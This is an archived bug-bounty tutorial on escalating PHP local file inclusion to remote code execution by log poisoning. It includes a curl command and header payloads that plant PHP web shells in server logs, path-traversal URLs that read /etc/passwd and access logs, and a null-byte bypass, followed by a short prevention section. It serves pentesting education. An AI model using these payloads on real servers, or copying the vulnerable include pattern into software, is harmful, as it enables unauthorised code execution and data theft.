# From LFI to RCE via Log Poisoning

- **Source URL:** https://medium.com/@zoningxtr/from-lfi-to-rce-via-log-poisoning-hack-servers-with-just-your-browser-headers-%EF%B8%8F-%EF%B8%8F-d0e708014e3f?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250905080831/https://medium.com/@zoningxtr/from-lfi-to-rce-via-log-poisoning-hack-servers-with-just-your-browser-headers-%EF%B8%8F-%EF%B8%8F-d0e708014e3f?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/9913 (id 9913)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 💣 From LFI to RCE via Log Poisoning: Hack Servers with Just Your Browser Headers 🕵️♂️📝

By

*💣 Discover how to turn LFI into RCE via log poisoning using only browser headers 🕵️♂️📝. Beginner-friendly guide with step-by-step examples, payloads, and security mitigations for bug bounty hunters & pentesters.*

D*isclaimer: This content is for educational purposes only. The author is not responsible for any use or misuse of the information provided. You are solely responsible for your actions. Always act ethically and ensure you have proper authorization.*

*Think LFI is harmless? What if your browser User-Agent could drop PHP code into server logs… and then you just include that log file? 💥*


Welcome to one of the most **dangerous escalation techniques** in the world of web exploitation — **Log File Poisoning**.

## 🧠 What’s the Idea?

1. You find a **Local File Inclusion (LFI)** vulnerability.
2. You send a **malicious payload in a controllable input**, like:

- `User-Agent`
- `Referer`
- `X-Forwarded-For`

1. The server logs that input into a file (e.g., `/var/log/apache2/access.log`)
2. You call the LFI with the log path:

`?page=/var/log/apache2/access.log`
✅ Boom — your PHP code gets executed!

## 🔥 Step-by-Step Exploitation Guide

## 🔎 Step 1: Find a LFI Endpoint

Example vulnerable code:

`php````
<?php
  include($_GET['page']);
?>
```
Test:

`https://target.com/index.php?page=../../../../etc/passwd`
If you see a valid file output, you’re in! 😈

## ✍️ Step 2: Poison the Log with PHP Code

Use `curl` or Burp Suite to send PHP code in a header:

`curl -A "<?php system('id'); ?>" https://target.com/`
This injects your payload into the Apache access log:

`/var/log/apache2/access.log`
📌 You can also try these headers:

- `Referer: <?php system('ls'); ?>`
- `X-Forwarded-For: <?php passthru($_GET['cmd']); ?>`

## 🚪 Step 3: Include the Log File via LFI

Now call:

`https://target.com/index.php?page=../../../../var/log/apache2/access.log`
🔁 You should see the output of `id`, `ls`, or whatever PHP you dropped.

## ✅ Optional: Add `cmd` Parameter

If your payload is:

`php``<?php system($_GET['cmd']); ?>`
Then trigger:

`https://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami`
🚨 Congratulations — you’ve turned an LFI into a **Remote Code Execution**.

## 🕳️ Common Log Paths

Here are typical log file locations depending on the web server:

Server Technology — Path

Apache `/var/log/apache2/access.log`

Apache `/var/log/httpd/access_log`

Nginx `/var/log/nginx/access.log`

Nginx `/usr/local/nginx/logs/access.log`

Custom `/logs/access.log` or `/log/access.log`

🛠️ Try all of these with `../../` traversal if you don’t know the full path.

## 🧪 Advanced: Bypass with Null Bytes (on old PHP versions)

If the LFI is sanitized to `.php` extensions, and null bytes are supported:

`?page=../../../../var/log/apache2/access.log%00`
The `%00` (null byte) can **truncate** the string.

*⚠️ Works on PHP ≤ 5.3 only — modern versions patched this.*


## 🧱 How to Prevent This Attack

🛡️ Secure coding practices are essential:

## ✅ 1. Whitelist Files

Use strict mapping:

`php````
$pages = ['home' => 'home.php', 'contact' => 'contact.php'];
include($pages[$_GET['page']]);
```
## ✅ 2. No Dynamic Includes

Avoid `include($_GET['page'])` entirely.

## ✅ 3. Disable Dangerous Features

In `php.ini`:

`ini````
allow_url_include = Off
display_errors = Off
```
## ✅ 4. Sanitize Input

Prevent `../` traversal:

`php````
if (strpos($_GET['page'], '..') !== false) {
    die("Access denied.");
}
```
## ✅ 5. Separate Logs from Web Root

Make sure log files are **not accessible** via web.

## 🧠 Final Thoughts

Log poisoning is **one of the most powerful ways** to escalate LFI into RCE — and it’s extremely **easy to miss**.

All it takes is:

- A misconfigured logger
- A vulnerable include
- And you… 💻👨💻

## 🔥 Quick Recap Cheat Sheet

StepAction

1️⃣Find LFI like `?page=`

2️⃣Poison logs via `User-Agent` with PHP code

3️⃣Include the log file using LFI

4️⃣Get RCE or shell

## 🧨 Tools for Automation

- 🐍 [fimap](https://web.archive.org/web/20250905080831/https://github.com/kurobeats/fimap)
- 🔎 Burp Suite Repeater — Send poisoned headers
- 🧰 Custom Bash or Python script for payload injection
